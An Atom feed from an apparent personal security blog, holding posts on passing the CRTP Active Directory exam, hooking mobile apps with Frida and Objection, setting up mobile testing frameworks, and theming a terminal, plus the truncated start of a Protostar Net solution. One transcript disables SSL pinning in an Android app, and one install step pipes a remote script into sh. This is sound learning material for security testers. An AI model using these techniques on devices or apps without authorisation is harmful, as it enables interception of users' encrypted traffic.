<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>UB3RS3C</title>
 <link href="http://localhost:4000/atom.xml" rel="self"/>
 <link href="http://localhost:4000/"/>
 <updated>2019-10-16T14:30:22+04:00</updated>
 <id>http://localhost:4000</id>
 <author>
   <name>Rizal Muhammed</name>
   <email></email>
 </author>

 
 <entry>
   <title>Pentester Academy Attacking and Defending Active Directory Lab</title>
   <link href="http://localhost:4000/2019/10/10/pa-adlab/"/>
   <updated>2019-10-10T00:00:00+04:00</updated>
   <id>http://localhost:4000/2019/10/10/pa-adlab</id>
   <content type="html">&lt;p&gt;As of October 2019 I am a Ceritified Red Team Professional. This post summarises my journey in which I overcame the challenges in &lt;a href=&quot;https://www.pentesteracademy.com/activedirectorylab&quot;&gt;Attacking and Defending Active Directory Lab&lt;/a&gt; and became a Ceritified Red Team Professional.&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;p&gt;TL;DR - My lack of knowledge in active directory and how much it intimidated me.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pa_adlab/unknown_.jpg&quot; alt=&quot;Unknown&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-lab&quot;&gt;The Lab&lt;/h2&gt;

&lt;p&gt;I purchased one month lab on 19th August 2019 and started my lab on 20th. Below image will give an overview of the lab environment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pa_adlab/activedirectorylab2.png&quot; alt=&quot;ADLAB&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After purchasing the lab access, I received the following stuff:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;VPN connection details to the lab.&lt;/li&gt;
  &lt;li&gt;Windows machine / user details.&lt;/li&gt;
  &lt;li&gt;Academy Attacking and Defending Active Directory course videos/slides/lab notes&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After VPN is connected, one can RDP to the student machine and start doing various lab exercises. The course videos are very beginner friendly and the instructor clearly and consicely explains various active directory concepts and demonstrates different attacks. At the end of each video, there are “Learning Objectives” which asks the student to apply whatever concept was explained in the video to solve the objective. The instructor encourages  the students to solve the objectives by themselves and if they are facing difficulties, there are walkthough videos and notes which cover these objectives.&lt;/p&gt;

&lt;p&gt;The course covers the following topics in depth:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Active Directory Enumeration. Use scripts, built-in tools and MS ActiveDirectory module to enumerate the target domain.&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation&lt;/li&gt;
  &lt;li&gt;Domain Privilege Escalation&lt;/li&gt;
  &lt;li&gt;Domain Persistence and Dominance&lt;/li&gt;
  &lt;li&gt;Cross trust attacks&lt;/li&gt;
  &lt;li&gt;Forest persistence and dominance&lt;/li&gt;
  &lt;li&gt;Defenses - Monitoring&lt;/li&gt;
  &lt;li&gt;Defenses and bypass - Architecture and Work culture Changes&lt;/li&gt;
  &lt;li&gt;Defenses and bypass - Deception&lt;/li&gt;
  &lt;li&gt;Defenses and bypass - PowerShell&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For me, one month lab duration was more than enough to go trough the whole course and do the learning objectives.&lt;/p&gt;

&lt;p&gt;Once I felt confident that I can tackle the certification exam, I scheduled it on 3rd October 2019. (Believe me it was hard to get a date).&lt;/p&gt;

&lt;h2 id=&quot;the-exam&quot;&gt;The Exam&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;The exam lab is a seperate Windows environment, which is fully patched and contains the latest Windows operating systems with configurations and privileges like a real enterprise environment. The students are required to compromise a fixed number of machines. The exam is designed in such a way that a student will be forced to apply all the different things taught in the course.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;To be successful, students must solve the challenges by enumerating the environment and carefully constructing attack paths. At the end of the exam, students need to submit the detailed solutions to challenges along with practical mitigations.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;My exam was scheduled to start on 4:30PM. Exactly at 4:00 PM, I got an email from the ADLAB team with the exam lab connection details. I was on my way back home from work. Once I reached my place, freshened up and started the exam at around 4:45PM.&lt;/p&gt;

&lt;p&gt;It took me whole 24 hours to compromise all the machines, This would vary for each individiual depending on the level of preparation and how well they have taken note of things during the enumeration process.&lt;/p&gt;

&lt;p&gt;In my case, I compromised one box within an hour and was stuck for the next 22 hours. I could see the whole path to the end and had all the information needed to proceed. I failed to notice one bit of information and I lost considerable amount of time. Despair and hopelessness.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pa_adlab/hopless.jpg&quot; alt=&quot;despair&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In between these 22 hours I constructed an attack path and was pretty much sure this is the way to the goal. But as I mentioned earlier, there was a disconnect or a gap in the path.&lt;/p&gt;

&lt;h3 id=&quot;breakthrough&quot;&gt;Breakthrough&lt;/h3&gt;

&lt;p&gt;4th October 2019, 03:26PM - As a last resort, I went though all the information I had collected hoping to find any bit of information that I might have overlooked and to my surprise, I came across one little detail. I got what I needed to bridge the gap in the path I had imagined.&lt;/p&gt;

&lt;p&gt;Within the next one hour I compromised the rest of the machines and finished the whole thing by 04:27PM. I had all the screenshots and notes taken. I went out for a coffee and rested for a while to compensate for the sleep I lost.&lt;/p&gt;

&lt;p&gt;I prepared a detailed report (50 pages) and submitted for evaluation in the next 24 hours (48 hours allowed).&lt;/p&gt;

&lt;h2 id=&quot;the-outcome&quot;&gt;The Outcome&lt;/h2&gt;

&lt;p&gt;On 10th of October 2019 at 09:08PM, I got an email from the ADLAB team saying that I cleared the certification exam.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pa_adlab/xm_result.png&quot; alt=&quot;result&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After few days, I recieved another mail from Pentester Academy with my CRTP certificate.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pa_adlab/cert.png&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Instructor (Nikhil Mittal), took the time to write an email to me congratulating me on clearning the exam and told me that he liked my report as it was very detailed and easy to follow.&lt;/p&gt;

&lt;p&gt;I learned an important lesson here; dont get sloppy during enumeration. Don’t &lt;strong&gt;overlook&lt;/strong&gt; anything. Enumerate everything, take note of every bit of information.&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;An awesome beginner friendly course on active directory security from pentester academy.&lt;/p&gt;

&lt;p&gt;I would highly recommend this course to anyone who wants to learn about active directory security.&lt;/p&gt;

</content>

 </entry>
 
 <entry>
   <title>(Objection) Mobile apps on remote device</title>
   <link href="http://localhost:4000/2018/09/21/objection-remote-device-app-hook/"/>
   <updated>2018-09-21T00:00:00+04:00</updated>
   <id>http://localhost:4000/2018/09/21/objection-remote-device-app-hook</id>
   <content type="html">&lt;p&gt;This post describes how to hook applications running on a remote device (iOS/Android) using Objection. Describes how to setup port forwarding.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;installing-frida-tools-cli-tools-on-linuxmac&quot;&gt;Installing frida-tools (CLI tools) on Linux/Mac&lt;/h2&gt;
&lt;p&gt;Use the following commands to install frida-tools.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;pip install frida-tools&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If &lt;strong&gt;frida-tools&lt;/strong&gt; already installed and wants to update to latest version.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;pip install frida-tools --upgrade&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;application-running-on-remote-ios-jailbroken-device&quot;&gt;Application running on Remote iOS (jailbroken) device&lt;/h2&gt;
&lt;h4 id=&quot;install-frida-frida-server-on-idevice&quot;&gt;Install Frida (frida-server) on iDevice&lt;/h4&gt;
&lt;ol&gt;
  &lt;li&gt;Add following repo to cydia - &lt;strong&gt;&lt;code&gt;https://build.frida.re&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Search for ‘frida’ and install frida.&lt;/li&gt;
  &lt;li&gt;Once installation finishes &lt;strong&gt;frida-server&lt;/strong&gt; will be present in path and listening on port &lt;strong&gt;27042&lt;/strong&gt; on the iDevice.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;port-forward-local-port-27042-to-remote-port-27042&quot;&gt;Port forward local port 27042 to remote port 27042&lt;/h4&gt;
&lt;p&gt;From PC/Mac terminal, run the following command to forward local port 27042 to remote port 27042.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;ssh -L 27042:127.0.0.1:27042 root@&amp;lt;iDevice_ip&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Enter iDevice root password and leave the terminal as is.&lt;/p&gt;

&lt;h4 id=&quot;list-applications-running-on-device&quot;&gt;List applications running on device&lt;/h4&gt;
&lt;p&gt;Make sure frida-tools is upto date on the pc/MAC.&lt;/p&gt;

&lt;p&gt;List running applications : &lt;strong&gt;&lt;code&gt;frida-ps -R&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h5 id=&quot;sample-output&quot;&gt;Sample Output&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;(virt-python3)  rizal@rizals-Mac$ frida-ps -R
 PID  Name
----  --------------------------------------------------------
2712  Camera
 980  InCallService
2001  Mail
1720  Messages
 790  MusicUIService
2715  Photos
1726  Settings
1253  User Authentication
3424  WhatsApp
....
&amp;lt;snipped&amp;gt;
....
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;hook-application-on-remote-idevice-with-objection&quot;&gt;Hook application on remote iDevice with Objection&lt;/h4&gt;
&lt;p&gt;Command: &lt;strong&gt;&lt;code&gt;objection --network --gadget &quot;Application Name&quot; explore&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;The &lt;strong&gt;&lt;code&gt;--network&lt;/code&gt;&lt;/strong&gt; flag tells objection to connect using a network connection instead of USB.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;sample-output-1&quot;&gt;Sample Output&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;(virt-python3)  rizal@rizals-Mac$ objection --network --gadget &quot;Reddit&quot; explore

     _     _         _   _
 ___| |_  |_|___ ___| |_|_|___ ___
| . | . | | | -_|  _|  _| | . |   |
|___|___|_| |___|___|_| |_|___|_|_|
        |___|(object)inject(ion) v1.4.3

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
com.reddit.Reddit on (iPhone: 11.3.1) [net] #
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;application-running-on-remote-android-rooted-device&quot;&gt;Application running on remote Android (rooted) device&lt;/h2&gt;

&lt;h4 id=&quot;install-frida-server-on-android-device&quot;&gt;Install frida-server on Android device&lt;/h4&gt;
&lt;p&gt;Connect to remote device with ADB.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;adb connect &amp;lt;android_device_ip&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Go to frida &lt;a href=&quot;https://github.com/frida/frida/releases&quot;&gt;releases&lt;/a&gt; page and get the &lt;strong&gt;frida-server&lt;/strong&gt; binary for android. Push it onto android device and set appropriate permissions.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;adb push frida-server /data/local/tmp/ &lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;adb shell &quot;chmod 755 /data/local/tmp/frida-server&quot;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Run frida-server on android device.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;adb shell &quot;/data/local/tmp/frida-server &amp;amp;&quot;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;port-forward-local-port-27042-to-remote-port-27042-1&quot;&gt;Port forward local port 27042 to remote port 27042&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;adb forward tcp:27042 tcp:27042&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If port forwarding is not setup, the following error will come up.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(objection-py3env) android@tamer:~$ frida-ps -R 
Failed to enumerate processes: unable to connect to remote frida-server
&lt;/code&gt;&lt;/pre&gt;
&lt;h5 id=&quot;sample-output-once-port-forward-is-setup&quot;&gt;Sample output once port forward is setup&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;(objection-py3env) android@tamer:~$ frida-ps -R 
 PID  Name
----  -------------------------------
 126  adbd
1966  android.ext.services
2177  android.process.acore
2084  android.process.media
1249  audioserver
 245  batteryd
1250  cameraserver
2162  com.android.calendar
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;hook-application-on-remote-android-with-objection&quot;&gt;Hook application on remote Android with Objection&lt;/h4&gt;
&lt;p&gt;Command: &lt;strong&gt;&lt;code&gt;objection --gadget &quot;Application Name&quot; explore&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h5 id=&quot;sample-output-2&quot;&gt;Sample Output&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;(objection-py3env) android@tamer:~$ objection --gadget &quot;net.fxxl&quot; explore

     _     _         _   _
 ___| |_  |_|___ ___| |_|_|___ ___
| . | . | | | -_|  _|  _| | . |   |
|___|___|_| |___|___|_| |_|___|_|_|
        |___|(object)inject(ion) v1.4.3

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions

net.fxxl on (Android: 7.0) [usb] # android sslpinning disable
Job: d9b3a203-acda-44d5-a179-5b4e84d8816a - Starting
[5b4e84d8816a] [android-ssl-pinning-bypass] Custom, Empty TrustManager ready
[5b4e84d8816a] [android-ssl-pinning-bypass] OkHTTP 3.x Found
[5b4e84d8816a] [android-ssl-pinning-bypass] TrustManagerImpl
Job: d9b3a203-acda-44d5-a179-5b4e84d8816a - Started
&lt;/code&gt;&lt;/pre&gt;
</content>

 </entry>
 
 <entry>
   <title>Passionfruit, Objection and Drozer</title>
   <link href="http://localhost:4000/2018/08/26/mobile-pt-frameworks/"/>
   <updated>2018-08-26T00:00:00+04:00</updated>
   <id>http://localhost:4000/2018/08/26/mobile-pt-frameworks</id>
   <content type="html">&lt;p&gt;Setup instructions for mobile application assessment frameworks Passionfruit, Objection and Drozer.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;setting-up-passionfruit&quot;&gt;Setting up passionfruit&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Update from official repo:&lt;/strong&gt;
Passionfruit is now avaliable on npm, so just type following command to install:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;npm install -g passionfruit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Old instructions:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Install pre-requisite nodejs for respective os from https://nodejs.org/en/&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Clone &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;Passionfruit&lt;/a&gt; to desktop or desired path.&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;git clone https://github.com/chaitin/passionfruit.git&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;or download zip file through browser and extract.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Open the terminal and cd into the passionfruit directory.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;To install npm dependencies and build the frontend, run the following command.&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;npm install&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;To build the bundle run below command&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;npm run build&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Start server using below command&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;npm start&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;Open &lt;strong&gt;http://localhost:31337&lt;/strong&gt; in browser to access the passionfruit web ui.&lt;/li&gt;
  &lt;li&gt;Connect your iDevice (which has frida-server running in background) to your pc or mac via USB.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once setup, next time when you have to start passionfruit, navigate to passionfruit directory and just run &lt;code&gt;npm start&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;note&quot;&gt;Note:&lt;/h3&gt;
&lt;p&gt;Require frida-server running on the jailbroken device&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ssh to device and navigate to frida-server binary location and run&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;./frida-server &amp;amp;&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;or if you have it added to PATH, run the following&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;frida-server &amp;amp;&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;setting-up-objection&quot;&gt;Setting up Objection&lt;/h2&gt;

&lt;p&gt;Install pre-requisite frida and frida-tools on host machine (OSX/Linux) with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pip install frida-tools # CLI tools
pip install frida       # Python bindings
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Its better to install objection in a virtual environment.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Clone &lt;a href=&quot;https://github.com/sensepost/objection/&quot;&gt;Objection Github Repo&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Install virtualenv&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;pip install virtualenv&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;or if already have it, update it&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;pip install virtualenv --upgrade&lt;/code&gt;*&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Create a new python3 virtual environment for objection with following command.&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;virtualenv --python=python3 ~/objection-python3-env&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Activate your new python virtual environment with:&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;source ~/objection-python3-env/bin/activate&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Next, start the installation using pip3 with:&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;pip3 install -U objection&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once the dependencies are installed, the objection command should be available in your PATH.&lt;/p&gt;

&lt;p&gt;To start analysing an app with objection, follow below steps.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;activate objection virtualenv by running:&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;source ~/objection-python3-env/bin/activate&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;To find application process name, with app running mobile device, and connected to the host machine via USB, run the following&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;frida-ps -U&lt;/code&gt; - This command lists all running processes on the device, you can manually look for the app name or do the below.&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;frida-ps -U | grep app_name_substring&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Having obtained app name hook it with objection.&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;objection --gadget &quot;app-name&quot; explore&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Now objection console will be opened.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Useful objection commands and wiki - https://github.com/sensepost/objection/wiki/Using-objection&lt;/p&gt;

&lt;h2 id=&quot;setting-up-drozer-for-android-assessments&quot;&gt;Setting up drozer for android assessments.&lt;/h2&gt;

&lt;p&gt;AndroidTamer4 comes with drozer preconfigured. VM can be downloaded from
&lt;a href=&quot;https://androidtamer.com/tamer4-release&quot;&gt;here&lt;/a&gt;. or  if you want to configure drozer on your linux machine follow the below steps.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Building Python wheel&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;git clone https://github.com/mwrlabs/drozer.git&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;cd drozer&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;python setup.py bdist_wheel&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Installing Python wheel&lt;/p&gt;

    &lt;p&gt;&lt;code&gt;sudo pip install drozer-2.x.x-py2-none-any.whl&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The file name drozer-2.x.x-py2-none-any.whl might be different, the x.x number might be different. The file will be in bdist directory.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Once installation finishes, drozer command will be available.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;install-drozer-agent-apk-in-android-device&quot;&gt;Install drozer-agent apk in android device.&lt;/h3&gt;
&lt;p&gt;Download latest agent apk from &lt;a href=&quot;https://github.com/mwrlabs/drozer/releases/&quot;&gt;here&lt;/a&gt; and install on the android device with the below command.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;adb install drozer-agent-2.x.x.apk&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now you have everything to analyze apps with drozer.&lt;/p&gt;

&lt;h2 id=&quot;analyzing-apps-with-drozer&quot;&gt;Analyzing apps with drozer.&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;Open drozer agent app on android device and click to start server. (default port 31415, can be changed)&lt;/li&gt;
  &lt;li&gt;Connect android device with USB debugging enabled on to host machine via usb.&lt;/li&gt;
  &lt;li&gt;setup port forward with adb.
&lt;code&gt;adb forward tcp:31415 tcp:31415&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Connect to drozer console.
&lt;code&gt;drozer console connect&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Now you are in drozer CLI.&lt;/li&gt;
&lt;/ol&gt;
</content>

 </entry>
 
 <entry>
   <title>Terminal Setup</title>
   <link href="http://localhost:4000/2018/08/26/Terminal-Setup/"/>
   <updated>2018-08-26T00:00:00+04:00</updated>
   <id>http://localhost:4000/2018/08/26/Terminal-Setup</id>
   <content type="html">&lt;p&gt;The terminal emulator and themes I use in my virtual machines.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;kali-vm&quot;&gt;Kali VM&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Terminal - &lt;strong&gt;Tilix&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;code&gt;sudo apt-get install tilix&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Tilix Themes
    &lt;ul&gt;
      &lt;li&gt;Tilix themes &lt;a href=&quot;https://github.com/storm119/Tilix-Themes&quot;&gt;GitHub Repo&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Argonaut&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;wget -qO $HOME&quot;/.config/tilix/schemes/argonaut.json&quot; https://git.io/v7QV5&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;Apply color scheme
        &lt;ul&gt;
          &lt;li&gt;Preferences/Default/Color/Color scheme&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/storm119/Tilix-Themes/blob/master/Themes.md&quot;&gt;Other Themes&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Shell - &lt;strong&gt;zsh&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;code&gt;chsh -s /bin/zsh&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Zsh Theme - &lt;strong&gt;oh-my-zsh&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;oh-my-zsh &lt;a href=&quot;https://github.com/robbyrussell/oh-my-zsh&quot;&gt;GitHub Repo&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Install via curl : &lt;code&gt;sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;Install via wget : &lt;code&gt;sh -c &quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;Theme - &lt;strong&gt;Agnoster&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Edit ~/.zshrc and set theme as follows
        &lt;ul&gt;
          &lt;li&gt;&lt;code&gt;ZSH_THEME=&quot;agnoster&quot;&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Install Powerline fonts. (Fixes font issue with agnoster theme)
        &lt;ul&gt;
          &lt;li&gt;&lt;code&gt;git clone https://github.com/powerline/fonts&lt;/code&gt;&lt;/li&gt;
          &lt;li&gt;&lt;code&gt;cd fonts&lt;/code&gt;&lt;/li&gt;
          &lt;li&gt;&lt;code&gt;./install.sh&lt;/code&gt;&lt;/li&gt;
          &lt;li&gt;or &lt;code&gt;sudo apt-get install fonts-powerline&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/term-setup/kali-setup.PNG&quot; alt=&quot;Kali Terminal&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;macososx-setup&quot;&gt;MacOS/OSX Setup&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Terminal Emulator - &lt;a href=&quot;https://www.iterm2.com/&quot;&gt;&lt;strong&gt;iTerm2&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;iTerm2 Themes
    &lt;ul&gt;
      &lt;li&gt;iTerm2 theme &lt;a href=&quot;https://github.com/mbadolato/iTerm2-Color-Schemes&quot;&gt;GitHub Repo&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Argonaut&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code&gt;git clone https://github.com/mbadolato/iTerm2-Color-Schemes.git&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;Open &lt;strong&gt;iTerm2&amp;gt; Preferences&amp;gt; Profile&amp;gt; Colors&amp;gt; Color Presets&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Click import and select theme in schemes directory inside cloned repo.&lt;/li&gt;
      &lt;li&gt;Select &lt;strong&gt;Argonaut&lt;/strong&gt; color scheme from Color Presets drop down&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Shell - &lt;strong&gt;zsh&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;code&gt;chsh -s /bin/zsh&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Zsh Theme - &lt;strong&gt;oh-my-zsh&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Follow instructions same as for Kali.&lt;/li&gt;
      &lt;li&gt;Set font &lt;strong&gt;Meslo LG L for powerline&lt;/strong&gt; in iTerm2.&lt;/li&gt;
      &lt;li&gt;Uncheck &lt;strong&gt;use different font for non-ASCII text&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/term-setup/mac-os-setup.PNG&quot; alt=&quot;OSX Terminal&quot; /&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>Exploit Exercises Protostar - Net 0-3 Solution</title>
   <link href="http://localhost:4000/2018/05/17/ee-protostar-net-solutions/"/>
   <updated>2018-05-17T00:00:00+04:00</updated>
   <id>http://localhost:4000/2018/05/17/ee-protostar-net-solutions</id>
   <content type="html">&lt;p&gt;&lt;a href=&quot;https://exploit-exercises.com/protostar/&quot;&gt;Protostar&lt;/a&gt; introduces the following in a friendly way:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Network programming&lt;/li&gt;
  &lt;li&gt;Byte order&lt;/li&gt;
  &lt;li&gt;Handling sockets&lt;/li&gt;
  &lt;li&gt;Stack overflows&lt;/li&gt;
  &lt;li&gt;Format strings&lt;/li&gt;
  &lt;li&gt;Heap overflows&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;net0&quot;&gt;Net0&lt;/h3&gt;
&lt;p&gt;This level takes a look at converting strings to little endian integers. This level is at &lt;strong&gt;/opt/protostar/bin/net0&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;source-code&quot;&gt;Source Code&lt;/h4&gt;
